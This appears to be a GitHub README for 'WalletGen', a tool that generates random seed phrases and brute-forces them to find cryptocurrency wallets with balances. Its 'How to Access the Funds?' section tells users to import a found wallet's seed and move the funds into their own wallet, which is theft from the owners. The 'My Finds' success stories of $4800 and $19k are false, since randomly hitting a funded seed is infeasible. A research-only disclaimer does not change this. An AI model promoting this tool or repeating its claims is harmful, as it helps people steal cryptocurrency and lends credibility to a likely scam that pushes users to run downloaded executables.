# Crypto Wallet Balance Checker: Verify Your Holdings with WalletGen

**Need to quickly check your crypto wallet balance?** **WalletGen** is a cutting-edge, open-source tool that provides an efficient **crypto wallet balance checker**. It is designed to not only generate wallets but also rapidly locate and check the balances of **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets**, leveraging real-time balance checking and the power of a high-performance C++ engine.

<!--
Meta description:
Check your crypto wallet balance with WalletGen. A high-speed, open-source tool to verify Bitcoin, Ethereum, and EVM-compatible wallet balances. Find your balance quickly and securely. Download now!
-->

## Quick Navigation
- [How It Works: Understanding Balance Verification](#how-it-works)
- [Why Choose WalletGen for Crypto Balance Checks?](#why-walletgen)
- [Features: What Makes WalletGen Ideal for Balance Verification?](#features)
- [Download WalletGen: Get Started Today](#how-to-start)
- [Optimize Your Checks: Database Download for Faster Results](#download-and-use-database-for-more-speed)
- [Found a Wallet? What to Do Next](#the-program-found-a-wallet--whats-next)
- [Recovering Your Bitcoin: Detailed Steps](#recovery-your-bitcoin-wallet)
- [My Finds: Success Stories and Real-World Examples](#my-finds)
- [FAQ: Crypto Wallet Balance Verification - Your Questions Answered](#-frequently-asked-questions-faq)
- [Build Instructions: Compiling and Running the Project](#building-the-project)
- [Support the Project: Make a Donation](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="crypto wallet balance" title="WalletGen wallet generator" height="460" src="/files/accent.webp" />
</p>

⚠️ **Important Disclaimer**:  WalletGen is a tool for research and educational purposes only. It is not designed for any unauthorized or malicious activities.  Always use it responsibly, only with wallets you have explicit permission to access.

## How It Works

WalletGen utilizes the robust methods of [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for the generation of Bitcoin wallets, and employs the [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing algorithm for EVM-compatible chains like Ethereum.

The main function of this software includes comparing generated addresses against pre-existing databases of wallets and also checking the current balances in real-time, through the use of public blockchain explorers. WalletGen, built in C++, is open-source, providing users with a faster and more efficient method compared to alternative tools. This speed boost relies heavily on your CPU & GPU.

## Why Choose WalletGen for Crypto Balance Verification?

Tired of slow balance checks? **WalletGen** is engineered for speed!  Unlike the slower, Python-based options, WalletGen is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance.  Whether you need to quickly verify balances, explore existing wallets, or recover your own holdings, WalletGen offers a powerful, efficient, and secure solution.

## Features

-   **Cryptocurrency Wallet Generation**: Create wallets for Bitcoin, Ethereum, BNB, MATIC, and other cryptocurrencies.
-   **Balance Verification with Brute-Force**: Quickly and effectively check the balance of existing wallets with brute-force techniques on both the Bitcoin network and EVM chains.
-   **Algorithm Support**: Supports Keccak256 for EVM wallets and BIP39, BIP44, and Bech32 for Bitcoin.
-   **Database Integration**: Leverage downloadable databases for faster balance checks.
-   **High-Speed Performance**: Maximizes CPU and GPU utilization for unparalleled speed.
-   **Bitcoin Seed Phrase Recovery**: Also includes tools for recovering Bitcoin wallets by seed phrase.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Windows Demo" title="WalletGen search lost bitcoin wallets on Windows" src="/files/font.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Linux Demo" title="WalletGen search lost bitcoin wallets on Linux" src="/files/see.webp" />
</p>

# How to start

## Windows
-   Download [Release](../../releases)
-   Unpack anywhere
-   Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget
or download [Release for Linux](../../releases)




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** enables the ability to check wallet balances using brute-force methods.

### Bitcoin (BTC) Wallet Search:

*   To begin, use key `3` in the menu, or run `start_search_btc.bat`, for a real-time search for balances across the internet. Note: this may take longer because it uses blockchain explorers.
*   Alternatively, press `6` to utilize the database search for a faster method.

### EVM Wallet Search (Ethereum, BNB, MATIC, etc.):

*   Press key `5` or run `start_search_evm.bat` for the internet-based balance search.
*   Press `6` for a faster search, utilizing the database.

### Speed Considerations:

*   The speed of the search depends heavily on your hardware, especially the graphics card (GPU). Running multiple instances of the program (1 to 4) can greatly increase your chances of finding a wallet with a balance.

Databases dramatically improve efficiency by eliminating the need for constant blockchain queries.

## The Program Found a Wallet — What’s Next?

When WalletGen detects a wallet with a balance:
*   The process will **Stop** immediately.
*   The wallet details are **Displayed** in the console.
*   The data is **Saved** in the `found_wallets.txt` file.

### How to Access the Funds?

1.  Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet (such as Metamask, Trust Wallet, or Electrum).
2.  You will then be able to transfer the funds to your own wallet.

>  If successful, consider showing your appreciation by donating!

## Recovery Your Bitcoin Wallet

WalletGen can recover Bitcoin wallets using the seed phrase. Enter the complete seed phrase, or use wildcards to search for missing words.

### Process Description

#### Search for Missing Words:

Use * to represent missing words. WalletGen checks all combinations.

#### Entering a Complete Seed Phrase:

Enter the full 12-word seed. WalletGen generates and checks addresses.

![recovery](/files/crop.webp)

### Important Recommendations

*   Seed phrases have 12 words.
*   Use * only for missing words.
*   Searching for missing words takes time.
*   Upon recovery, data is saved.

## My Finds

![mywallet](/files/piece.webp)

I've recovered two BTC wallets with balances. The first had 0.000032 BTC; the second, 0.0528 BTC (around $4800).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/files/output.webp" />
</p>

### New Find 4/9/2025

After searching for a week, I found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my biggest find!

![image](/files/crisp.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/files/angle.webp)

## Building the Project

1.  Open the project file (`CryptoWalletGen.sln`) in Visual Studio or a compatible C++ compiler.
2.  Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
Download WalletGen on the [release download page](../../releases).

### ❓ Where can I download a database of known addresses?
Find the current database on the [release page](../../releases).

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes, WalletGen can help recover lost Bitcoin wallets using brute-force seed generation and a known-address database.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute, submit a pull request.

## Donate

Consider donating a portion of any recovered balance as a thank you to support continued development.

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)



Update:  Friday 13 June 2025 Admin links